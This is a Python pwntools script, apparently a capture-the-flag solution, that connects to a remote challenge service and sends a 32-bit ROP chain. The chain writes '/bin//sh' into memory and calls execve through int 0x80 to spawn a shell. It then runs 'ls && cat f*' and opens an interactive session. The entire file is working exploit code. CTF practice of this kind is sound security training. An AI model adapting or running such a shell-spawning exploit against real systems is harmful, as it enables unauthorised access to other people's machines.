from pwn import *

def exploit():
    binary = ELF("./pwn5")
    #p = process("./pwn5")
    p = remote("pwn.tamuctf.com", 4325)
    padding = 16
    payload = "/"
    payload += "A" * padding
    payload += p32(0x0806f68a) # pop edx ; ret
    payload += p32(0x080eb060) # @ .data
    payload += p32(0x080b8836) # pop eax ; ret
    payload += '/bin'
    payload += p32(0x0805501b) # mov dword ptr [edx], eax ; ret
    payload += p32(0x0806f68a) # pop edx ; ret
    payload += p32(0x080eb064) # @ .data + 4
    payload += p32(0x080b8836) # pop eax ; ret
    payload += '//sh'
    payload += p32(0x0805501b) # mov dword ptr [edx], eax ; ret
    payload += p32(0x0806f68a) # pop edx ; ret
    payload += p32(0x080eb068) # @ .data + 8
    payload += p32(0x08049373) # xor eax, eax ; ret
    payload += p32(0x0805501b) # mov dword ptr [edx], eax ; ret
    payload += p32(0x080481c9) # pop ebx ; ret
    payload += p32(0x080eb060) # @ .data
    payload += p32(0x080df3bd) # pop ecx ; ret
    payload += p32(0x080eb068) # @ .data + 8
    payload += p32(0x0806f68a) # pop edx ; ret
    payload += p32(0x080eb068) # @ .data + 8
    payload += p32(0x08049373) # xor eax, eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0807aecf) # inc eax ; ret
    payload += p32(0x0806d2d7) # int 0x80
    p.sendline(payload)
    sleep(1)
    p.sendline("ls && cat f*")
    p.interactive()

if __name__ == "__main__":
    exploit()